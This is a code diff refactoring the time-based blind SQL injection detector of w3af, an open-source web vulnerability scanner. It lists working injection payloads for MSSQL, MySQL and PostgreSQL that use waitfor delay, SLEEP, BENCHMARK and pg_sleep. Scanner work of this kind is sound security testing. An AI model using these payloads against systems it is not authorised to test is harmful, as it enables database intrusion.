@@ -35,58 +35,14 @@ class BlindSQLTimeDelay(object):
 
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
-
-    def __init__(self, uri_opener):
-        self._uri_opener = uri_opener
-
-    def is_injectable(self, mutant):
-        """
-        Check if this mutant is delay injectable or not.
-
-        @mutant: The mutant object that I have to inject to
-        :return: A vulnerability object or None if nothing is found
-        """
-        for delay_obj in self._get_delays():
-
-            ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
-            success, responses = ed.delay_is_controlled()
-
-            if success:
-                # Now I can be sure that I found a vuln, we control the response
-                # time with the delay
-                desc = 'Blind SQL injection using time delays was found at: %s'
-                desc = desc % mutant.found_at()
-                
-                response_ids = [r.id for r in responses]
-                
-                v = Vuln.from_mutant('Blind SQL injection vulnerability', desc,
-                                     severity.HIGH, response_ids, 'blind_sqli',
-                                     mutant)
-
-                om.out.debug(v.get_desc())
-
-                return v
-
-        return None
-
-    def _get_delays(self):
-        """
-        :return: A list of statements that are going to be used to test for
-                 blind SQL injections. The statements are objects.
-                 
-                 IMPORTANT: Note that I need this function that generates
-                 unique instances of the delay objects! Adding this to a list
-                 that's defined at the class level will bring threading issues
-        """
-        res = []
-
+    DELAYS = [
         # MSSQL
-        res.append(ExactDelay("1;waitfor delay '0:0:%s'--"))
-        res.append(ExactDelay("1);waitfor delay '0:0:%s'--"))
-        res.append(ExactDelay("1));waitfor delay '0:0:%s'--"))
-        res.append(ExactDelay("1';waitfor delay '0:0:%s'--"))
-        res.append(ExactDelay("1');waitfor delay '0:0:%s'--"))
-        res.append(ExactDelay("1'));waitfor delay '0:0:%s'--"))
+        ExactDelay("1;waitfor delay '0:0:%s'--"),
+        ExactDelay("1);waitfor delay '0:0:%s'--"),
+        ExactDelay("1));waitfor delay '0:0:%s'--"),
+        ExactDelay("1';waitfor delay '0:0:%s'--"),
+        ExactDelay("1');waitfor delay '0:0:%s'--"),
+        ExactDelay("1'));waitfor delay '0:0:%s'--"),
 
         # MySQL 5
         #
@@ -96,19 +52,19 @@ class BlindSQLTimeDelay(object):
         # Payloads are heavily based on the ones from SQLMap which can be found
         # at xml/payloads/05_time_blind.xml
         #
-        res.append(ExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
-        res.append(ExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))foo)"))
+        ExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))foo)"),
+        ExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))foo)"),
 
         # Single and double quote string concat
-        res.append(ExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+'"))
-        res.append(ExactDelay('"+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+"'))
+        ExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+'"),
+        ExactDelay('"+(SELECT * FROM (SELECT(SLEEP(%s)))foo)+"'),
 
         # These are required, they don't cover the same case than the previous
         # ones (string concat).
-        res.append(ExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND '1'='1"))
-        res.append(ExactDelay('" AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND "1"="1'))
-        res.append(ExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR '1'='2"))
-        res.append(ExactDelay('" OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR "1"="2'))
+        ExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND '1'='1"),
+        ExactDelay('" AND (SELECT * FROM (SELECT(SLEEP(%s)))foo) AND "1"="1'),
+        ExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR '1'='2"),
+        ExactDelay('" OR (SELECT * FROM (SELECT(SLEEP(%s)))foo) OR "1"="2'),
 
         # MySQL 4
         #
@@ -129,17 +85,67 @@ class BlindSQLTimeDelay(object):
         # TODO: Need to implement variable_delay.py (modification of ExactDelay)
         #       and use the following there:
         #
-        #res.append( delay("1 or BENCHMARK(2500000,MD5(1))") )
-        #res.append( delay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
-        #res.append( delay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )
+        # ExactDelay("1 or BENCHMARK(2500000,MD5(1))") )
+        # ExactDelay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
+        # ExactDelay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )
 
         # PostgreSQL
-        res.append(ExactDelay("1 or pg_sleep(%s)"))
-        res.append(ExactDelay("1' or pg_sleep(%s) and '1'='1"))
-        res.append(ExactDelay('1" or pg_sleep(%s) and "1"="1'))
+        ExactDelay("1 or pg_sleep(%s)"),
+        ExactDelay("1' or pg_sleep(%s) and '1'='1"),
+        ExactDelay('1" or pg_sleep(%s) and "1"="1'),
 
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
         # TODO: https://github.com/andresriancho/w3af/issues/12385
+    ]
 
-        return res
+    def __init__(self, uri_opener):
+        self._uri_opener = uri_opener
+        self._debugging_id = None
+
+    def set_debugging_id(self, debugging_id):
+        self._debugging_id = debugging_id
+
+    def get_debugging_id(self):
+        return self._debugging_id
+
+    def is_injectable(self, mutant, delay_obj):
+        """
+        Check if this mutant is delay injectable or not.
+
+        @mutant: The mutant object that I have to inject to
+        :return: A vulnerability object or None if nothing is found
+        """
+        ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
+        ed.set_debugging_id(self.get_debugging_id())
+        success, responses = ed.delay_is_controlled()
+
+        if success:
+            # Now I can be sure that I found a vuln, we control the response
+            # time with the delay
+            desc = 'Blind SQL injection using time delays was found at: %s'
+            desc %= mutant.found_at()
+
+            response_ids = [r.id for r in responses]
+
+            v = Vuln.from_mutant('Blind SQL injection vulnerability', desc,
+                                 severity.HIGH, response_ids, 'blind_sqli',
+                                 mutant)
+
+            om.out.debug(v.get_desc())
+
+            return v
+
+    def get_delays(self):
+        """
+        :return: A list of statements that are going to be used to test for
+                 blind SQL injections. The statements are objects.
+                 
+                 IMPORTANT: Note that I need this function that generates
+                 unique instances of the delay objects! Adding this to a list
+                 that's defined at the class level will bring threading issues
+        """
+        return self.DELAYS
+
+    def __repr__(self):
+        return '<BlindSQLTimeDelay did=%s>' % self.get_debugging_id()
